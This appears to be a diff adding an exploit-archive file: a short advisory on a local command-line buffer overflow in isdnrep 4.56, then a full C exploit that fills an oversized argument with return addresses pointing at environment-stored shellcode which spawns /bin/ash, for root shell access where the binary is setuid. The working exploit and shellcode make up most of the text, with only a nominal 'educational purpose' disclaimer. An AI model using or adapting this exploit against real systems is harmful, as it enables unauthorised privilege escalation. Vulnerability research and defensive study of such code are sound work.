@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/8100/info
+ 
+isdnrep has been reported prone to a local command line argument buffer overflow vulnerability.
+ 
+The issue presents itself due do a lack of sufficient bounds checking performed on user-supplied data that is copied from the command line into a reserved internal memory buffer. It is possible for a local attacker to influence the execution flow of isdnrep and have arbitrary operation codes executed in the context of the vulnerable application. Exploitation could permit privilege escalation on systems where the application is installed setuid/setgid.
+ 
+It should be noted that although isdnrep version 4.56 has been reported vulnerable, other versions might also be vulnerable.
+
+/*
+ *  Author: snooq [http://www.angelfire.com/linux/snooq/]
+ *  Date: 4 July 2003
+ *
+ *  This bug was just one of the bugs reported by
+ *  Stx Security Labs. 
+ *
+ *  Their original posting can be found here:
+ *
+ *  http://www.static-x.org/downloads/code/5358isdnrape.c
+ *	
+ *  This is again a classical example of stack smashing.
+ *  Exploitation is trivial and this code is done in just 
+ *  a few minutes.
+ *
+ *  As usual, it is for educational purpose only. Not much
+ *  profit to gain from this one as not many distro ships 
+ *  it with 'suid' bit set.
+ *
+ */
+
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+#define BASE		0xbfffffff+1	/* 'Bottom' of stack   */		
+#define BUFF_SIZE	2152		/* Number of bytes     */
+#define SC_SIZE		sizeof(shellcode)	
+#define PATH_SIZE	sizeof(PATH)	
+#define PATH		"/usr/bin/isdnrep"
+
+char shellcode[]=
+        "\xeb\x1f\x5e\x89\x76\x09\x31\xc0\x88\x46\x08\x89"
+        "\x46\x0d\xb0\x0b\x89\xf3\x8d\x4e\x09\x8d\x56\x0d"
+        "\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
+        "\xff\xff/bin/ash";
+
+main() {
+	
+	char *env[2]={shellcode,NULL};
+	char *buf, *ptr;
+	long sc_addr;
+	int i, buffsize=BUFF_SIZE; 
+
+	if (!(buf=malloc(buffsize+1))) {
+		printf("Can't allocate memory.\n");
+		exit(-1);
+	}
+	
+	sc_addr=BASE-4-SC_SIZE-PATH_SIZE;
+
+	ptr=buf;
+	for(i=0;i<buffsize;i+=4) {
+		*((long *)ptr)=sc_addr; 
+		ptr+=4;
+	}
+	*ptr++=0;
+
+	printf("shellcode is at: 0x%08x\n",sc_addr);
+
+	execle(PATH,"pine","-t",buf,NULL,env);
+}
